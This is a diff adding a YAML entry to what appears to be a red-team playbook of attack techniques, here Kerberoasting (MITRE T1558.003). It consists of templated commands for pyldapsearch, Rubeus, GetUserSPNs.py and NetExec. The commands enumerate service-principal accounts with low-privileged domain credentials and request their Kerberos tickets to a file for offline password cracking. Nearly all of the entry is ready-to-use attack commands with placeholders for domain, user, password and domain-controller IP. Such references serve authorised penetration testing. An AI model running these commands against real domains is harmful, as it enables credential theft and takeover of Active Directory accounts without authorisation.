@@ -1,0 +1,30 @@
+name: "Kerberoasting"
+mitre_technique_id: "T1558.003"
+sections:
+- title: "Enumeration"
+  tabs:
+  - title: "pyldapsearch"
+    content: |
+      ```
+      pyldapsearch '{{DOMAIN_NAME}}/{{LOWPRIVILEGED_DOMAIN_USER}}:{{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}}' "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" -dc-ip {{DC_IP}} -ldaps -output users_kerberoast.txt
+      ```
+- title: "Roasting"
+  tabs:
+  - title: "Rubeus"
+    content: |
+      Rubeus does not support roasting based on a list. You can roast single users:
+      ```
+      rubeus.exe kerberoast /user:{{TARGET_DOMAIN_USER}} /simple
+      ```
+  - title: "GetUserSPNS.py"
+    content: |
+      userfile option requires one username per line (just the username, no domain needed).
+      ```
+      GetUserSPNs.py -request -outputfile kerberoastables.txt -dc-ip {{DC_IP}} -usersfile {{TARGET_FILE_NAME}} '{{DOMAIN_NAME}}/{{LOWPRIVILEGED_DOMAIN_USER}}:{{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}}'
+      ```
+  - title: "NetExec"
+    content: |
+      This will enumerate the accounts again!
+      ```
+      nxc ldap {{DC_IP}} -u {{LOWPRIVILEGED_DOMAIN_USER}} -p {{LOWPRIVILEGED_DOMAIN_USER_PASSWORD}} --kerberoasting output.txt
+      ```
